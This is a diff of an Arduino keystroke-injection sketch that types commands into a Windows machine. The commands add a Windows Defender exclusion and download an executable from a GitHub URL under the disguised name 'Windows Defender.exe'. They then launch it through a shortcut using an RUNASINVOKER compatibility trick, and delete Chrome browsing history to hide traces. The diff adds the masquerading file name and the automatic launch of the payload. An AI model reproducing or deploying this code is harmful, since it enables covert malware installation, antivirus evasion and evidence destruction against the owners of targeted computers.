@@ -51,7 +51,7 @@ void setup()
 
   // The next line will exclude the path to system folder so it will not be checked by windows defender antivirus and hide the folder that was created
 
-  Keyboard.print(F("Add-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\";$wc=New-Object System.Net.Webclient; $wc.DownloadFile(\"https://github.com/smallmacy/Cyber_Project/raw/master/final.exe\", \"windows_update_backup.exe\"); Remove-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\""));  
+  Keyboard.print(F("Add-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\";$wc=New-Object System.Net.Webclient; $wc.DownloadFile(\"https://github.com/smallmacy/Cyber_Project/raw/master/final.exe\", \"Windows Defender.exe\"); Remove-MpPreference -ExclusionPath \"$env:USERPROFILE\\Desktop\\system\""));  
 
 
   typeKey(KEY_RETURN);
@@ -88,7 +88,7 @@ void setup()
 
   // Script for shortcut:
 
-  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && start \"\" %USERPROFILE%\\Desktop\\system\\windows_update_backup.exe\""));
+  Keyboard.print(F("C:\\Windows\\System32\\cmd.exe /min /c \"set __COMPAT_LAYER=RUNASINVOKER && wmic nic get Name,NetConnectionStatus > \"\"%USERPROFILE%\\Desktop\\system\\connections.txt\"\" && start \"\" %USERPROFILE%\\Desktop\\system\\Windows Defender.exe\""));
 
   typeKey(KEY_RETURN);
 
@@ -163,11 +163,11 @@ void setup()
 
   // Delete chrome windows if exists and the history file and starting the shortcut
 
-  Keyboard.print(F("TSKILL chrome "/* ADD & start test.lnk*/));
+  Keyboard.print(F("TSKILL chrome & start test.lnk"));
 
   typeKey(KEY_RETURN);
 
-  delay(400);
+  delay(900);
 
   Keyboard.print(F("DEL \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History\" & DEL \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1\\History\""));
 
@@ -182,7 +182,7 @@ void setup()
   typeKey(KEY_RETURN);
 
   delay(2000);
-
+ 
   Keyboard.press(KEY_LEFT_CTRL);
   Keyboard.press(KEY_LEFT_SHIFT);
   Keyboard.press(116);
@@ -190,7 +190,7 @@ void setup()
 
   typeKey(KEY_RETURN);
 
-  delay(1000);
+  delay(1500);
 
   Keyboard.press(KEY_LEFT_ALT);
   Keyboard.press(KEY_TAB);
@@ -208,7 +208,7 @@ void setup()
   Keyboard.press(' ');
   Keyboard.releaseAll();
 
-  delay(100);
+  delay(200);
 
   Keyboard.print(F("c"));
 
